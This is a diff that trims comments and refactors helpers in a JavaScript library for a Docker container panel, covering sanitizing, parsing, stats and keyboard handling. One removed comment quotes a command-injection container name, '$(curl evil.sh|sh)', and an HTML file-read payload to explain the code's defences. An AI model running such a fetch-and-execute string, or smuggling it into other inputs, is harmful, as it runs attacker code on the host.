@@ -1,44 +1,32 @@
 .pragma library
 
-// Pure data logic for Kaj. Nothing here touches QML, Quickshell, or the
-// filesystem, so every function below is exercised by test/model.test.js under
-// plain node. The rule this file exists to enforce: anything that comes back
-// from the Docker daemon is untrusted input, and it gets normalized here once
-// rather than being sprinkled through the UI.
+// Pure logic for Kaj. No QML, no filesystem. Tested by test/model.test.js.
+// All data from Docker is untrusted and is cleaned here.
 
 // ---------------------------------------------------------------------------
 // Untrusted text
 // ---------------------------------------------------------------------------
 
-// Container names, image tags, labels, and above all log lines are written by
-// whoever built the image, not by the user running it. Two rules follow, and
-// both are enforced here rather than left to each call site:
-//
-//   1. This text is never concatenated into a shell string. Service.qml runs
-//      every command as an argv array, so a container literally named
-//      $(curl evil.sh|sh) is just eleven boring characters.
-//   2. This text is never handed to a rich-text renderer. QML's Text parses
-//      HTML when textFormat is RichText, which turns an <img src="file://...">
-//      in a log line into a local file read. The UI pins textFormat to
-//      PlainText; sanitize() additionally strips the control bytes that would
-//      otherwise let a log line repaint the panel.
+// Names, tags, labels and log lines come from the image, not from the user.
+// Rule 1: never put this text in a shell string. Service.qml uses argv arrays.
+// Rule 2: never render it as rich text. The UI uses Text.PlainText.
 
-// CSI sequences (ESC [ ... final), OSC strings (ESC ] ... BEL/ST), the short
-// two-byte escapes, and the 8-bit CSI. Written with explicit hex escapes and
-// never literal control bytes: a raw ESC or NUL in the source is invisible in
-// a diff and makes grep treat the file as binary, which is exactly the wrong
-// property for the code that sanitizes untrusted input.
+// Escape sequences: CSI, OSC, short escapes, and 8-bit CSI.
+// Written as hex escapes. A literal ESC byte makes grep treat the file as binary.
 var ansiPattern = /\x1b\[[0-9;?]*[ -\/]*[@-~]|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)|\x1b[@-Z\\-_]|\x9b[0-9;?]*[ -\/]*[@-~]/g
-// C0 controls except tab and newline, plus DEL and the C1 range.
+// C0 controls except tab and newline, plus DEL and C1.
 var controlPattern = /[\x00-\x08\x0b-\x1f\x7f-\x9f]/g
 
-function stripAnsi(text) {
-  return String(text === undefined || text === null ? "" : text).replace(ansiPattern, "")
+// undefined and null become "", so callers never test for them.
+function str(value) {
+  return value === undefined || value === null ? "" : String(value)
 }
 
-// Full cleanup for anything that will be shown to a human: drop escape
-// sequences first, then any remaining control bytes, then cap the length so one
-// pathological line cannot stall the renderer.
+function stripAnsi(text) {
+  return str(text).replace(ansiPattern, "")
+}
+
+// Clean text for display. Strips escapes, then control bytes, then caps length.
 function sanitize(text, maxLength) {
   var limit = maxLength === undefined ? 4096 : maxLength
   var out = stripAnsi(text).replace(controlPattern, "")
@@ -46,34 +34,30 @@ function sanitize(text, maxLength) {
   return out
 }
 
-// Single-line variant, for names and status strings that must not wrap.
+// Single-line version, for names and status text.
 function sanitizeLine(text, maxLength) {
-  return sanitize(String(text === undefined || text === null ? "" : text).replace(/[\r\n\t]+/g, " "), maxLength === undefined ? 256 : maxLength)
+  var single = str(text).replace(/[\r\n\t]+/g, " ")
+  return sanitize(single, maxLength === undefined ? 256 : maxLength)
 }
 
 // ---------------------------------------------------------------------------
 // Environment
 // ---------------------------------------------------------------------------
 
-// Every value is hidden until asked for. Kaj deliberately does not try to guess
-// which keys are secret: any such rule is a list of the names someone thought
-// of, and the one it misses is the one that leaks. DATABASE_URL, S3_ENDPOINT and
-// a plain PORT can each carry something private, so the safe default is the same
-// for all of them, and revealing is always a deliberate act.
+// All values are hidden until the user asks. Kaj does not guess which keys are
+// secret, because such a list always misses one.
 
-// Only the first "=" separates; values routinely contain more.
+// Only the first = separates. Values often contain more.
 function splitEnvEntry(entry) {
-  var text = String(entry === undefined || entry === null ? "" : entry)
+  var text = str(entry)
   var index = text.indexOf("=")
   if (index < 0) return { key: sanitizeLine(text), value: "" }
   return { key: sanitizeLine(text.slice(0, index)), value: sanitizeLine(text.slice(index + 1), 512) }
 }
 
-// A fixed-width mask: the real length is itself a hint about the value, so it
-// is not reproduced. An unset value stays visibly empty, which is worth knowing
-// and gives nothing away.
+// Fixed-width mask. The real length is a hint, so it is not shown.
 function maskValue(value) {
-  return String(value === undefined || value === null ? "" : value) === "" ? "" : "••••••••"
+  return str(value) === "" ? "" : "••••••••"
 }
 
 function envEntries(list) {
@@ -90,18 +74,11 @@ function envEntries(list) {
 // Parsing
 // ---------------------------------------------------------------------------
 
-// Docker emits one JSON object per line. A malformed line is skipped rather
-// than failing the whole refresh: a single unparseable container should not
-// blank the panel.
-//
-// Every line is stripped of escape sequences before parsing. This is not
-// belt-and-braces: `docker stats` writes real cursor-control codes around each
-// record even when its output is a pipe rather than a terminal, so a line
-// arrives as ESC[H{"CPUPerc":...}ESC[K and JSON.parse rejects all of it. The
-// same strip covers a log or event payload that carries escapes deliberately.
+// Docker writes one JSON object per line. Bad lines are skipped.
+// Escapes are stripped first: docker stats writes cursor codes around each record.
 function parseJsonLines(text) {
   var out = []
-  var lines = stripAnsi(String(text === undefined || text === null ? "" : text)).split("\n")
+  var lines = stripAnsi(str(text)).split("\n")
   for (var i = 0; i < lines.length; i++) {
     var line = lines[i].replace(controlPattern, "").trim()
     if (line === "") continue
@@ -109,16 +86,15 @@ function parseJsonLines(text) {
       var parsed = JSON.parse(line)
       if (parsed && typeof parsed === "object") out.push(parsed)
     } catch (e) {
-      // Ignore: partial line from a stream, or output we do not understand.
+      // Ignore: partial line, or output we do not understand.
     }
   }
   return out
 }
 
-// Whole-document JSON, for commands that answer with one array rather than a
-// record per line: `docker network inspect` and `docker system df -v`.
+// Whole-document JSON, for docker network inspect and docker system df -v.
 function parseJson(text) {
-  var body = stripAnsi(String(text === undefined || text === null ? "" : text))
+  var body = stripAnsi(str(text))
     .replace(controlPattern, "").trim()
   if (body === "") return []
   try {
@@ -129,11 +105,10 @@ function parseJson(text) {
   }
 }
 
-// Accept only what a Docker id can actually be. A daemon that answered with
-// anything else is a daemon we do not pass to a command line.
+// Accept only valid Docker ids. Anything else never reaches a command line.
 function parseIds(text) {
   var out = []
-  var lines = String(text === undefined || text === null ? "" : text).split("\n")
+  var lines = str(text).split("\n")
   for (var i = 0; i < lines.length; i++) {
     var line = lines[i].trim()
     if (/^[0-9a-f]{12,64}$/.test(line)) out.push(line)
@@ -150,8 +125,7 @@ function displayName(name) {
   return sanitizeLine(String(name || "").replace(/^\//, ""))
 }
 
-// Health is only meaningful when the image declares a healthcheck; absent one,
-// "" means "no opinion" and must not be shown as unhealthy.
+// Health is empty when the image has no healthcheck. Do not show it as unhealthy.
 function healthOf(state) {
   if (!state || typeof state !== "object") return ""
   var health = state.Health
@@ -159,8 +133,7 @@ function healthOf(state) {
   return sanitizeLine(health.Status || "")
 }
 
-// One container, normalized from the inspect payload into the flat shape the
-// UI binds against.
+// One container, flattened from inspect into the shape the UI binds to.
 function normalizeContainer(raw) {
   if (!raw || typeof raw !== "object") return null
   var state = raw.State && typeof raw.State === "object" ? raw.State : {}
@@ -188,21 +161,16 @@ function normalizeContainer(raw) {
     project: sanitizeLine(labels["com.docker.compose.project"] || ""),
     service: sanitizeLine(labels["com.docker.compose.service"] || ""),
     ports: normalizePorts(raw.Ports),
-    // Names only. The full Mounts and Networks objects carry host paths and
-    // IPAM detail the panel never shows, and the volumes view only ever asks
-    // "is this one of yours?".
+    // Names only. The full objects carry host paths and IPAM detail the UI never shows.
     mounts: mountNames(raw.Mounts),
     networks: networkNames(raw.Networks),
-    // 0 means "no limit set", which is also what Docker reports for a
-    // container that simply inherits the host's memory. Keeping the raw 0
-    // is what lets the UI tell "unlimited" from "limited to all of it".
+    // 0 means no limit. Keeping the 0 lets the UI tell unlimited from limited.
     memoryLimit: positiveNumber(raw.MemoryLimit),
     cpuLimit: positiveNumber(raw.NanoCpus) / 1e9
   }
 }
 
-// A bind mount has no Name, only a host path: it is not a volume and must not
-// make one look used.
+// A bind mount has no name. It is not a volume and must not make one look used.
 function mountNames(list) {
   var out = []
   if (!list || list.length === undefined) return out
@@ -240,7 +208,7 @@ function normalizeContainers(list) {
   return out
 }
 
-// Docker's zero timestamp means "never"; return 0 so callers can test falsily.
+// Docker's zero timestamp means never. Return 0 so callers can test it.
 function parseTime(value) {
   var text = String(value || "")
   if (text === "" || text.indexOf("0001-01-01") === 0) return 0
@@ -248,8 +216,7 @@ function parseTime(value) {
   return isFinite(ms) ? ms : 0
 }
 
-// NetworkSettings.Ports maps "5800/tcp" to a list of host bindings, or to null
-// for an exposed-but-unpublished port.
+// Ports map "5800/tcp" to host bindings, or to null when not published.
 function normalizePorts(ports) {
   var out = []
   if (!ports || typeof ports !== "object") return out
@@ -263,7 +230,7 @@ function normalizePorts(ports) {
       out.push({ containerPort: containerPort, protocol: parts[1] || "tcp", hostIp: "", hostPort: 0, published: false })
       continue
     }
-    // Collapse the v4/v6 pair Docker reports for a single -p flag.
+    // Collapse the v4/v6 pair Docker reports for one -p flag.
     var seen = {}
     for (var j = 0; j < bindings.length; j++) {
       var hostPort = parseInt(bindings[j] && bindings[j].HostPort, 10)
@@ -281,9 +248,8 @@ function normalizePorts(ports) {
   return out
 }
 
-// Only a port actually bound on a loopback-reachable address is worth offering
-// as a clickable link. 0.0.0.0 and :: are reachable via localhost; a binding to
-// some other specific interface may not be, so it is shown but not linked.
+// Only a port on a loopback-reachable address can be a link.
+// 0.0.0.0 and :: are reachable. Another specific interface may not be.
 function browsableUrl(port) {
   if (!port || !port.published || port.protocol !== "tcp") return ""
   var host = port.hostIp
@@ -292,19 +258,12 @@ function browsableUrl(port) {
   return scheme + "://localhost:" + port.hostPort
 }
 
-// The ports worth putting in a row: published, and reachable from this machine.
-// An exposed-but-unpublished port has nothing to click, and a port bound to one
-// specific remote interface is not reachable via localhost, so neither earns
-// space in a bar popup.
+// Ports worth showing in a row: published, and reachable from this machine.
 function linkablePorts(container) {
   var out = []
   if (!container) return out
-  // Deliberately not Array.isArray: this array is nested inside a container
-  // object that has been stored in a QML `var` property, and QML hands such
-  // arrays back as a list type that indexes and reports length exactly like an
-  // array while failing Array.isArray. The top-level helpers get away with the
-  // stricter check because they receive arrays built moments earlier in the
-  // same JS context; anything reached *through* a QML-held object cannot.
+  // Not Array.isArray: QML returns arrays held in a var property as a list type
+  // that fails that check but works like an array.
   var ports = container.ports
   if (!ports || ports.length === undefined) return out
   var seen = {}
@@ -321,8 +280,8 @@ function linkablePorts(container) {
 // Stats
 // ---------------------------------------------------------------------------
 
-// `docker stats` reports preformatted strings ("3.49%", "74.71MiB / 7.628GiB").
-// Parse to numbers so the UI can sort and draw meters instead of printing them.
+// docker stats returns strings like "3.49%" and "74.71MiB / 7.628GiB".
+// Parse them to numbers so the UI can sort and draw meters.
 function parsePercent(value) {
   var n = parseFloat(String(value || "").replace("%", ""))
   return isFinite(n) && n >= 0 ? n : 0
@@ -360,10 +319,8 @@ function normalizeStat(raw) {
   }
 }
 
-// Usage against the container's own limit, or -1 when it has none. An
-// unlimited container is not "using 3% of memory" in any useful sense: the
-// number it would be measured against is the whole host, which says nothing
-// about whether this container is close to trouble.
+// Usage against the container's own limit, or -1 when it has none.
+// Without a limit the only number to compare against is the whole host.
 function memoryPressure(container, stats) {
   if (!container || !stats) return -1
   var limit = Number(container.memoryLimit || 0)
@@ -373,14 +330,11 @@ function memoryPressure(container, stats) {
   return used / limit
 }
 
-// The threshold a figure turns urgent at. Not a cliff — a container can sit
-// at 95% happily — but it is the point where trouble stops being surprising.
+// The level where a figure turns urgent. Not a hard limit, but close to trouble.
 var pressureWarning = 0.9
 
-// The same question for CPU, and the reason it is answerable at all: without
-// a limit, `docker stats` reports a percentage of every core on the host, so
-// 150% is either half of the machine or the whole of this container's ration
-// depending on a number the stats stream never mentions.
+// The same for CPU. docker stats reports a percentage of every core on the host,
+// so 150% means nothing until you know the container's own ration.
 function cpuPressure(container, stats) {
   if (!container || !stats) return -1
   var cpus = Number(container.cpuLimit || 0)
@@ -390,8 +344,7 @@ function cpuPressure(container, stats) {
   return cpu / (cpus * 100)
 }
 
-// Stats arrive as a stream keyed by short id; fold them into a lookup the UI
-// can index by container.
+// Stats arrive keyed by short id. Fold them into a lookup the UI can index.
 function mergeStats(existing, raw) {
   var out = {}
   if (existing && typeof existing === "object") {
@@ -411,20 +364,15 @@ function mergeStats(existing, raw) {
 // Errors
 // ---------------------------------------------------------------------------
 
-// A container disappearing mid-refresh is normal, not an error worth showing.
-// The snapshot is two commands — list the ids, then inspect them — so anything
-// removed in between is reported by the second as "No such container". That is
-// a race the design accepts in exchange for never needing a shell, and the
-// panel should absorb it silently rather than blaming the user for it.
+// A container that disappears during a refresh is normal, not an error.
+// The snapshot is two commands, so anything removed between them is missing.
 function isMissingContainerError(line) {
   return /No such (container|object)/i.test(String(line || ""))
 }
 
-// Docker reports one line per failure, so removing a dozen containers yields a
-// dozen near-identical lines. Show the first thing that actually matters, and
-// only that: a wall of concatenated messages is read as noise and ignored.
+// Docker writes one line per failure. Show only the first one that matters.
 function firstRealError(text, maxLength) {
-  var lines = String(text === undefined || text === null ? "" : text).split("\n")
+  var lines = str(text).split("\n")
   for (var i = 0; i < lines.length; i++) {
     var line = lines[i].trim()
     if (line === "") continue
@@ -451,18 +399,15 @@ function matchesStatus(container, filter) {
   if (!container) return false
   if (filter === "running") return container.running === true
   if (filter === "stopped") return container.running !== true
-  // "Problems" is the filter nothing else offers and the one most worth
-  // having: everything a person would want to act on right now, in one click.
+  // Problems is the filter nothing else offers: everything worth acting on now.
   if (filter === "problems") return containerSeverity(container) !== "ok"
   return true
 }
 
-// Substring rather than fuzzy. Container names are short identifiers people
-// type exactly; a fuzzy match on "db" would drag in every container with a d
-// and a b in it and feel broken.
+// Substring, not fuzzy. Names are short ids that people type exactly.
 function matchesQuery(container, query) {
   if (!container) return false
-  var needle = String(query === undefined || query === null ? "" : query).trim().toLowerCase()
+  var needle = str(query).trim().toLowerCase()
   if (needle === "") return true
   var haystacks = [container.name, container.service, container.project, container.image, container.shortId]
   for (var i = 0; i < haystacks.length; i++) {
@@ -480,10 +425,7 @@ function filterContainers(containers, query, statusFilter) {
   return out
 }
 
-// Chip counts come from the same list the chips filter, so the numbers always
-// add up to what clicking them will show. Counted before the text query is
-// applied: a chip that reads "Running 8" while a search is narrowing the list
-// would be lying about what its own click produces, so the query is included.
+// Counts come from the same list the chips filter, so the numbers always match.
 function statusCounts(containers, query) {
   var list = Array.isArray(containers) ? containers : []
   var counts = { all: 0, running: 0, stopped: 0, problems: 0 }
@@ -501,9 +443,7 @@ function statusCounts(containers, query) {
 // Keyboard cursor
 // ---------------------------------------------------------------------------
 
-// The panel renders grouped, but the keyboard moves through one flat sequence:
-// j from the last container of one project lands on the first of the next.
-// Groups are a visual convenience, not a navigation boundary.
+// The panel renders groups, but the keyboard moves through one flat list.
 function flattenGroups(groups) {
   var out = []
   var list = Array.isArray(groups) ? groups : []
@@ -514,13 +454,9 @@ function flattenGroups(groups) {
   return out
 }
 
-// Identity of a rendered list: which containers, in which order. The panel
-// rebuilds its rows only when this changes, never merely because a container's
-// data did. A Repeater destroys and recreates every delegate when its model is
-// replaced, and each row rebuilt that way loses its hover — so with one
-// restart-looping container emitting an event every couple of seconds, every
-// tooltip in the panel flickered. Row data reaches the rows through bindings
-// instead, which update in place.
+// Identity of a rendered list: which containers, in which order.
+// Rows are rebuilt only when this changes. A Repeater recreates every delegate
+// when its model is replaced, and a rebuilt row loses its hover.
 function groupsKey(groups) {
   var parts = []
   var list = Array.isArray(groups) ? groups : []
@@ -532,8 +468,7 @@ function groupsKey(groups) {
   return parts.join("\u0000")
 }
 
-// Header numbers for one project, read live from the full container list so a
-// stable row list does not leave the counts stale.
+// Header numbers for one project, read live so a stable row list stays correct.
 function groupStats(containers, project) {
   var list = Array.isArray(containers) ? containers : []
   var mine = []
@@ -543,11 +478,7 @@ function groupStats(containers, project) {
   return { running: countRunning(mine), total: mine.length, severity: rollupSeverity(mine) }
 }
 
-// Clamps rather than wraps. Wrapping a short list makes j feel like it did
-// nothing; stopping at the end says "that is all of them".
-// Where a scroll lands. Kept here rather than inline in the panel for the
-// same reason the cursor is: it is arithmetic with edges, and edges are what
-// gets it wrong.
+// Where a scroll lands. Kept here because edges are what gets it wrong.
 function scrollTarget(contentY, delta, step, contentHeight, viewportHeight) {
   var max = Math.max(0, Number(contentHeight || 0) - Number(viewportHeight || 0))
   var next = Number(contentY || 0) + Number(delta || 0) * Number(step || 0)
@@ -555,9 +486,7 @@ function scrollTarget(contentY, delta, step, contentHeight, viewportHeight) {
   return Math.max(0, Math.min(max, next))
 }
 
-// Wraps. A list long enough to need the cursor is long enough that walking
-// back to the other end is the slow way round, and there is no ambiguity about
-// what the ends mean here: the list is the whole content, not a window onto it.
+// Wraps, because walking back to the other end of a long list is slow.
 function moveCursor(index, delta, length) {
   if (length <= 0) return -1
   if (index < 0) return delta > 0 ? 0 : length - 1
@@ -565,9 +494,7 @@ function moveCursor(index, delta, length) {
   return next < 0 ? next + length : next
 }
 
-// Keeps the cursor pointing at the same container across a refresh. Without
-// this, an event that rebuilds the list while you are three rows down snaps
-// the selection back to the top mid-keystroke.
+// Keeps the cursor on the same container across a refresh.
 function cursorIndexForId(list, id, fallbackIndex) {
   var items = Array.isArray(list) ? list : []
   if (items.length === 0) return -1
@@ -580,9 +507,8 @@ function cursorIndexForId(list, id, fallbackIndex) {
   return Math.max(0, Math.min(items.length - 1, fallbackIndex))
 }
 
-// The key bound to each action. Tooltips and the help sheet both read this, so
-// a rebind cannot leave one of them advertising a key that no longer works.
-// start and stop share Enter because they are one intent: flip this container.
+// The key for each action. Tooltips and the help sheet both read this.
+// Start and stop share Enter because they are one intent: flip this container.
 function actionHotkey(action) {
   switch (action) {
     case "start":
@@ -597,7 +523,7 @@ function actionHotkey(action) {
   }
 }
 
-// Every binding the panel answers to, in the order it is worth learning them.
+// Every binding the panel answers to, in the order worth learning them.
 var keyHelp = [
   { keys: "h  l", what: "Switch view" },
   { keys: "j  k", what: "Move between containers, or scroll" },
@@ -614,10 +540,8 @@ var keyHelp = [
   { keys: "Esc", what: "Clear search, then close" }
 ]
 
-// Present tense, because it is shown while the action is still running. A row
-// mid-action must say what is happening to it: `docker stop` can take ten
-// seconds to escalate from SIGTERM to SIGKILL, and a row that only greys out
-// for that long is indistinguishable from one that is broken.
+// Present tense, because the row shows this while the action still runs.
+// docker stop can take ten seconds, and a row that only greys out looks broken.
 function busyLabel(action) {
   switch (action) {
     case "start": return "Starting…"
@@ -631,15 +555,12 @@ function busyLabel(action) {
   }
 }
 
-// Why a key did nothing, phrased as the thing to do about it. Returning "" means
-// the action is available and the caller should just run it. Silence is the
-// wrong answer for a keystroke: the user cannot tell a no-op from a broken bind.
+// Why a key did nothing, written as the thing to do about it.
+// Empty means the action can run. Silence would look like a broken key.
 function unavailableReason(action, container, readOnly) {
   if (!container) return "Select a container first"
-  // Read-only comes first, and the ordering is the whole point: a running
-  // container told you to stop it before removing it, which is advice that
-  // does not work — stopping is refused too. The reason has to be the one
-  // that is actually in the way.
+  // Read-only comes first. Telling the user to stop a container does not help
+  // when stopping is refused too.
   if (readOnly === true && action !== "logs") return "Read-only mode is on"
   if (availableActions(container).indexOf(action) !== -1) return ""
   if (action === "remove") {
@@ -651,35 +572,23 @@ function unavailableReason(action, container, readOnly) {
   return "Not available for " + container.name
 }
 
-// The action Enter runs on the cursor row. Start and stop are the same key
-// because they are the same intent — "flip this container" — and needing to
-// know which one applies before pressing a key defeats the point.
+// The action Enter runs. Start and stop are one key because they are one intent.
 function primaryAction(container) {
   if (!container) return ""
   if (container.paused) return "unpause"
   return container.running ? "stop" : "start"
 }
 
-// Which keystrokes open search. "/" is the plain character; Ctrl+F arrives as
-// the ASCII control code for F (0x06), because that is what Qt puts in
-// event.text and PanelKeyCatcher forwards event.text verbatim.
-//
-// Neither of the tidier routes works here. A QtQuick Shortcut never fires:
-// Qt only delivers shortcuts to an active window, and a Quickshell layer-shell
-// surface is never "active" in that sense — which is why nothing in the whole
-// Omarchy shell uses one. Handling it on a parent item does not work either,
-// because a QML KeyEvent arrives already accepted, so PanelKeyCatcher swallows
-// every key it does not recognise instead of letting it bubble.
+// Which keys open search. "/" is plain. Ctrl+F arrives as 0x06 in event.text.
+// A QtQuick Shortcut never fires on a layer-shell surface, and a KeyEvent
+// arrives already accepted, so PanelKeyCatcher swallows what it does not know.
 function isSearchKey(text) {
   if (text === "/") return true
-  return String(text === undefined || text === null ? "" : text).charCodeAt(0) === 6
+  return str(text).charCodeAt(0) === 6
 }
 
-// What a key means, regardless of whether it can run right now. Kept separate
-// from availability so the caller can tell "that key does nothing" apart from
-// "that key means something you cannot do yet" — the first deserves silence,
-// the second deserves an explanation. h/j/k/l and x are consumed by
-// PanelKeyCatcher before Kaj sees them, so they are absent here by necessity.
+// What a key means, whether or not it can run now. Kept apart from availability
+// so the caller can tell an unknown key from a blocked action.
 function intendedAction(key, container) {
   if (key === "r") return "restart"
   if (key === "o") return "logs"
@@ -688,18 +597,8 @@ function intendedAction(key, container) {
   return ""
 }
 
-// The action a key should actually run, or "" if the container does not
-// support it. Kept so a caller that only wants the runnable verb has one.
-function actionForKey(key, container) {
-  if (!container) return ""
-  var action = intendedAction(key, container)
-  if (action === "") return ""
-  return availableActions(container).indexOf(action) === -1 ? "" : action
-}
-
-// Compose grouping is the organizing idea of the panel: people think in
-// projects ("my app"), not in a flat list of eleven containers. Standalone
-// containers collect under an empty project id and render last.
+// Containers are grouped by Compose project, because people think in projects.
+// Standalone containers collect under an empty project id and render last.
 function groupByProject(containers) {
   var order = []
   var groups = {}
@@ -732,8 +631,7 @@ function groupByProject(containers) {
   return out
 }
 
-// Running first, then by compose service name so a project's containers keep a
-// stable order across refreshes rather than shuffling on every event.
+// Running first, then by service name, so rows keep a stable order.
 function compareContainers(a, b) {
   if (a.running !== b.running) return a.running ? -1 : 1
   var left = a.service || a.name
@@ -748,8 +646,7 @@ function countRunning(containers) {
   return n
 }
 
-// Severity drives the bar icon colour. "error" is reserved for states a person
-// would want to know about immediately without opening anything.
+// Severity drives the bar icon colour. error means: look at this now.
 function containerSeverity(container) {
   if (!container) return "ok"
   if (container.oomKilled) return "error"
@@ -762,9 +659,8 @@ function containerSeverity(container) {
   return "ok"
 }
 
-// A glyph replaces the status dot where the shape itself carries the meaning.
-// Paused is the case that most needs it: a paused container is still "up", so a
-// coloured dot reads as running and the distinction is lost. "" means the dot.
+// A glyph replaces the status dot where the shape carries the meaning.
+// A paused container is still up, so a coloured dot would read as running.
 function statusGlyph(container) {
   if (!container) return ""
   if (container.paused) return "󰏤"
@@ -787,16 +683,9 @@ function rollupSeverity(containers) {
 // Compose
 // ---------------------------------------------------------------------------
 
-// Group actions go through `docker compose`, not through a loop over the
-// containers Kaj happens to know about. Compose owns concepts the container
-// list cannot see — networks, dependency order, which services belong to the
-// project at all — and reimplementing it by fanning out `docker stop` would
-// quietly diverge from what `docker compose stop` does in the same directory.
-//
-// `-p <project>` is enough for these four: Compose v2 finds an existing
-// project's containers by label, so they work from any working directory
-// without the compose file. `up` deliberately is not here — it needs the
-// config file, which Kaj cannot depend on still being where it was.
+// Group actions run docker compose, not a loop over containers.
+// Compose owns the network and the dependency order.
+// -p is enough for these four. up is not here: it needs the compose file.
 var composeVerbs = ["start", "stop", "restart", "down"]
 
 function composeCommand(project, verb) {
@@ -810,8 +699,7 @@ function composeBusyLabel(verb) {
   return busyLabel(verb)
 }
 
-// down removes containers and the project network, so it is confirmed like any
-// other destructive verb, and the prompt says what goes beyond the containers.
+// down removes containers and the project network, so it is confirmed.
 function composeConfirmText(project, running, total) {
   return "Run docker compose down on " + project + "? "
     + total + (total === 1 ? " container" : " containers")
@@ -836,14 +724,11 @@ function viewLabel(view) {
 // Volumes and networks
 // ---------------------------------------------------------------------------
 
-// `docker system df` and `docker volume ls` report labels as one flat string,
-// "a=1,b=2", unlike inspect, which returns an object. A label value containing
-// a comma is therefore ambiguous and cannot be recovered — Docker loses that
-// information before Kaj sees it. Only the Compose project name is read here,
-// and Compose does not put commas in it.
+// docker system df and docker volume ls report labels as one string, "a=1,b=2".
+// A label value with a comma cannot be recovered. Only the project name is read.
 function parseLabelString(value) {
   var out = {}
-  var text = String(value === undefined || value === null ? "" : value)
+  var text = str(value)
   if (text === "") return out
   var parts = text.split(",")
   for (var i = 0; i < parts.length; i++) {
@@ -878,8 +763,7 @@ function normalizeVolumes(list) {
   return out
 }
 
-// The three networks every daemon has. They cannot be removed and are not
-// interesting to look at, so they are named rather than treated as findings.
+// The three networks every daemon has. They cannot be removed.
 var builtinNetworks = ["bridge", "host", "none"]
 
 function isBuiltinNetwork(name) {
@@ -920,7 +804,7 @@ function normalizeNetworks(list) {
     var network = normalizeNetwork(list[i])
     if (network) out.push(network)
   }
-  // Built-in networks last: they are always present and never actionable.
+  // Built-in networks last: always present, never actionable.
   out.sort(function (a, b) {
     if (a.builtin !== b.builtin) return a.builtin ? 1 : -1
     return a.name.localeCompare(b.name)
@@ -928,11 +812,8 @@ function normalizeNetworks(list) {
   return out
 }
 
-// Usage is derived from the containers Kaj already streams rather than from a
-// second command. `docker volume ls` cannot say what is using a volume, and
-// `docker system df -v` only counts — but more importantly, a separate command
-// is a snapshot: this way a volume stops being unused the moment a container
-// starts, on the same event that redraws the container list.
+// Usage comes from the containers Kaj already watches, not a second command.
+// A volume stops being unused on the same event that redraws the container list.
 function containerVolumeNames(container) {
   var out = []
   if (!container) return out
@@ -959,11 +840,9 @@ function volumeUsers(containers, volumeName) {
   return usersOf(containers, volumeName, containerVolumeNames)
 }
 
-// Only running containers. A stopped container keeps its network in its
-// config, but its endpoint is gone: Docker will remove the network out from
-// under it without complaint, so calling it a member would be a lie. Volumes
-// are the opposite case — `docker volume rm` refuses while any container
-// references one, running or not — so volumeUsers counts them all.
+// Only running containers. A stopped container keeps the network in its config,
+// but its endpoint is gone and Docker will remove the network anyway.
+// Volumes are the opposite: docker volume rm refuses while any container uses one.
 function networkMembers(containers, networkName) {
   return usersOf(containers, networkName, function (container) {
     if (!container || container.running !== true) return []
@@ -972,8 +851,7 @@ function networkMembers(containers, networkName) {
   })
 }
 
-// "unused", or the containers using it, capped so one popular network cannot
-// push everything else off the row.
+// Unused, or the containers using it, capped so a long list cannot fill the row.
 function usageLabel(users) {
   if (!users || users.length === 0) return "unused"
   if (users.length <= 3) return users.join(", ")
@@ -997,9 +875,7 @@ function filterByName(list, query) {
 // Images and disk
 // ---------------------------------------------------------------------------
 
-// An image with no repository is dangling: an old layer set orphaned by a
-// rebuild that took its tag. They are the bulk of what reclaimable space
-// usually is, so they are named rather than shown as "<none>:<none>".
+// An image with no repository is dangling: old layers left by a rebuild.
 function normalizeImage(raw) {
   if (!raw || typeof raw !== "object") return null
   var repository = sanitizeLine(raw.Repository || "")
@@ -1014,8 +890,7 @@ function normalizeImage(raw) {
     size: parseSize(raw.Size),
     sizeText: sanitizeLine(raw.Size || ""),
     created: sanitizeLine(raw.CreatedSince || ""),
-    // How many containers reference it. Zero means nothing would break if it
-    // went, which is the only question worth answering in a bar popup.
+    // How many containers use it. Zero means nothing breaks if it goes.
     containers: parseInt(raw.Containers, 10) || 0
   }
 }
@@ -1032,8 +907,8 @@ function normalizeImages(list) {
   return out
 }
 
-// `docker system df` reports one row per type. Reclaimable arrives as
-// "1.2GB (34%)", so the number is parsed out and the percentage dropped.
+// docker system df reports one row per type.
+// Reclaimable arrives as "1.2GB (34%)", so the percentage is dropped.
 function normalizeDiskRow(raw) {
   if (!raw || typeof raw !== "object") return null
   var reclaimable = String(raw.Reclaimable || "")
@@ -1065,7 +940,7 @@ function totalReclaimable(rows) {
 
 function matchesImageQuery(image, query) {
   if (!image) return false
-  var needle = String(query === undefined || query === null ? "" : query).trim().toLowerCase()
+  var needle = str(query).trim().toLowerCase()
   if (needle === "") return true
   return (image.name + " " + image.id).toLowerCase().indexOf(needle) !== -1
 }
@@ -1097,11 +972,8 @@ function formatUptime(startedAtMs, nowMs) {
   return days + "d"
 }
 
-// Memory is binary everywhere it is discussed: `docker stats` prints MiB,
-// `--memory 512m` means 512 MiB, and free(1) agrees. Printing 537 MB for a
-// limit someone wrote as 512m makes Kaj look wrong even though the byte count
-// is right. Image and disk sizes stay decimal, which is what `docker images`
-// and `docker system df` report.
+// Memory is binary: docker stats prints MiB and --memory 512m means 512 MiB.
+// Image and disk sizes stay decimal, which is what Docker reports for them.
 function formatMemory(bytes) {
   var n = Number(bytes)
   if (!isFinite(n) || n <= 0) return "0 B"
@@ -1132,8 +1004,7 @@ function formatPercent(value) {
   return (n >= 10 ? Math.round(n) : n.toFixed(1)) + "%"
 }
 
-// The one-line summary under a container name. Prefers whatever a person most
-// needs to know: why it died, then health, then how long it has been up.
+// The line under a container name. Shows why it died, then health, then uptime.
 function statusSummary(container, nowMs) {
   if (!container) return ""
   if (container.oomKilled) return "Out of memory"
@@ -1145,12 +1016,9 @@ function statusSummary(container, nowMs) {
     return "Stopped"
   }
   var uptime = formatUptime(container.startedAt, nowMs)
-  // A container still running its healthcheck has not meaningfully been "up"
-  // for anything yet, so the elapsed time is noise. The row pulses its dot
-  // instead, which says "in progress" without pretending to be a measurement.
+  // A starting container has not been up for anything yet, so time is noise.
   if (container.health === "starting") return "Starting"
-  // Unhealthy keeps its uptime: how long something has been up while failing
-  // its healthcheck is exactly what you want to know.
+  // Unhealthy keeps its uptime: how long it has failed is what you want to know.
   if (container.health === "unhealthy") return "Unhealthy" + (uptime ? " · up " + uptime : "")
   return uptime ? "Up " + uptime : "Running"
 }
@@ -1167,31 +1035,24 @@ function barSummary(containers) {
 // Actions
 // ---------------------------------------------------------------------------
 
-// Which actions apply to a container in its current state. Keeping this here
-// rather than in QML means the button set is testable, and means the UI cannot
